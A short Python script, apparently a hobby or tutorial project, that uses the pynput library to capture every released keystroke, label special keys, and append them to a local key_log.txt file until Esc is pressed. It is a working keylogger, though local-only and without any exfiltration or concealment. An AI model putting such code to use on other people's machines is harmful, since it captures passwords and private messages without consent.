from pynput import keyboard
from pathlib import Path

ROOT_DIR = Path(__file__).parent


f=open(ROOT_DIR / 'key_log.txt',"a")
f.write("New session started\n")
f.close()
  
def on_release(key):
    st=""
    st+=str(key).replace("'","")
    if(str(key)=="Key.esc"):
        return False
    if(str(key) == "Key.backspace"):
        st = " BACKSPACE "
    if(str(key) == "Key.ctrl_l"):
        st = " CTRL "
    if(str(key) == "Key.space"):
        st = " "
    if(str(key) == "Key.shift"):
        st = " SHIFT "
    if(str(key) == "Key.delete"):
        st = " DELETE "
    if(str(key) == "Key.tab"):
        st = " TAB "
    if(str(key) == "Key.enter"):
        st = " ENTER "
    if(str(key) == "Key.alt_l"):
        st = " ALT "
    if(str(key) == "Key.up"):
        st = " UP "
    if(str(key) == "Key.down"):
        st = " DOWN "
    if(str(key) == "Key.left"):
        st = " LEFT "
    if(str(key) == "Key.right"):
        st = " RIGHT "
        
    f=open(ROOT_DIR / 'key_log.txt',"a")
    f.write(st)
    f.close()
    
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()